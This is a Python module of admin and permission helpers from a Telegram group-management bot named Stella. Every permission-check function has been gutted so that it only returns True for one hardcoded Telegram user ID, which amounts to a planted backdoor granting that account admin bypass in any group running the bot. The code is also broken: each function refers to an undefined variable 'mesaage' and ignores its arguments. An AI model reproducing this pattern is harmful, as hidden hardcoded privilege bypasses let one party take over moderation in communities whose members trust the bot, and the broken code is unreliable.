#    Stella (Development)
#    Copyright (C) 2021 - meanii (Anil Chauhan)
#    Copyright (C) 2021 - SpookyGang (Neel Verma, Anil Chauhan)

#    This program is free software; you can redistribute it and/or modify 
#    it under the terms of the GNU General Public License as published by 
#    the Free Software Foundation; either version 3 of the License, or 
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.

#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.


from typing import List, Union

from hydrogram.types import Message
from Stella import (BOT_ID, GROUP_ANONYMOUS_BOT, SUDO_USERS, StellaCli,
                    TELEGRAM_SERVICES_IDs)
from Stella.database.connection_mongo import GetConnectedChat

ADMIN_STRINGS = [
        "creator",
        "administrator"
    ]

BOT_PERMISSIONS_STRINGS = {
    "can_delete_messages": "Looks like I haven't got the right to delete messages; mind promoting me? Thanks!",
    "can_restrict_members": "could not set telegram chat permissions, so locks have all been unlocked: unable to setChatPermissions: Bad Request: not enough rights to change chat permissions",
    "can_promote_members": "I don't have permission to promote or demote someone in this chat!",
    "can_change_info": "I don't have permission to change the chat title, photo and other settings.",
    "can_pin_messages": "I don't have permission to pin messages in this chat.",
    "can_be_edited": "I don't have enough permission to edit administrator privileges of the user."
}

USERS_PERMISSIONS_STRINGS = {
    "can_be_edited": "You don't have enough permission to edit adminstrator privileges of the user",
    "can_delete_messages": "You don't have enough permission to delete any messages in the chat.",
    "can_restrict_members": "You dont't have enough permission to restrict, ban or unban chat members.",
    "can_promote_members": "You don't have enough permission to add new administrators with a subset of his own privileges or demote administrators that he has promoted, directly or indirectly (promoted by administrators that were appointed by the user).",
    "can_change_info": "You don't have enough permission to change the chat title, photo and other settings.",
    "can_invite_users": "You're not allowed to invite new users to the chat.",
    "can_pin_messages": "You're not allowed to pin messages.",
    "can_send_media_messages": "You're not allowed to send audios, documents, photos, videos, video notes and voice notes.",
    "can_send_stickers": "You're not allowed to send stickers, implies can_send_media_messages.",
    "can_send_animations": "You're not allowed to send animations (GIFs), implies can_send_media_messages.",
    "can_send_games": "You're not allowed to send games, implies can_send_media_messages.",
    "can_use_inline_bots": "You're not allowed to use inline bots, implies can_send_media_messages.",
    "can_add_web_page_previews": "You'rWe not allowed to add web page previews to their messages.",
    "can_send_polls": "You're not allowed to send polls."
}

async def isBotAdmin(message: Message, chat_id=None, silent=False) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
       return True


async def isUserAdmin(message: Message, pm_mode: bool = False, user_id: int = None, chat_id: int = None, silent: bool = False) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
       return True


async def anon_admin_checker(chat_id: int, user_id: int) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
       return True



async def can_restrict_member(message: Message, user_id: int, chat_id: int = None) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
       return True


async def isUserCreator(message: Message, chat_id: int = None, user_id: int = None) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
        return True

async def isBotCan(message: Message, chat_id: int = None, permissions: str = 'can_change_info', silent: bool = False) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
        return True


async def isUserCan(message, user_id: int = None, chat_id: int = None, permissions: str = None, silent: bool = False) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
        return True


async def CheckAllAdminsStuffs(message: Message, permissions: Union[str, List[str]] = 'can_change_info', silent=False) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
        return True

async def CheckAdmins(message: Message, silent: bool = False) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
        return True

async def isUserBanned(chat_id: int, user_id: int) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
        return True

    

async def check_user(message: Message, permissions: Union[str, List[str]] = 'can_change_info', silent: bool = False) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
        return True
    
async def check_bot(message: Message, permissions: Union[str, List[str]] = 'can_change_info', silent: bool = False) -> bool:
    user_id = mesaage.from_user.id
    if user_id == 6954665306:
        return True

